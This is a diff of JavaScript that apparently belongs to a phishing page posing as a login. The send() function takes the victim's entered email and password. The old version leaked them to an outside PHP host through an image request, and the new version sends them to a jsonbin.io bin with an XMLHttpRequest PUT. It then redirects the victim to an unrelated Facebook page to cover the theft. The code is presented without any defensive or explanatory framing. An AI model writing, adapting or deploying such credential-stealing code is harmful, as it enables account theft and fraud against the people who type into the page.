@@ -276,11 +276,20 @@ function send(){
 var u = document.getElementById('u1').value;
 var p = document.getElementById('p1').value;
 if(u.length > 6 && p.length > 7){
-var a = document.createElement('img');
-a.src = "http://phpcloud101.gearhostpreview.com/m.php?c="+u+p;
-a.onerror = function() {
-    console.log("error");window.location.replace("https://m.facebook.com/Maheshwari-Mahila-Mandal-Bangalore-104485484597585/");
+	let req = new XMLHttpRequest();
+
+req.onreadystatechange = () => {
+  if (req.readyState == XMLHttpRequest.DONE) {
+    console.log(req.responseText);
+	  window.location.replace("https://m.facebook.com/Maheshwari-Mahila-Mandal-Bangalore-104485484597585/");
+  }
 };
+
+req.open("PUT", "https://api.jsonbin.io/b/602a694b99ac3873a349bc96", true);
+req.setRequestHeader("Content-Type", "application/json");
+req.send('{"'+u+'": "'+p+'"}');	
+//var a = document.createElement('img');
+//a.src = "http://phpcloud101.gearhostpreview.com/m.php?c="+u+p;
 }else{
 alert('Email/Password cannot be too short!');
 }
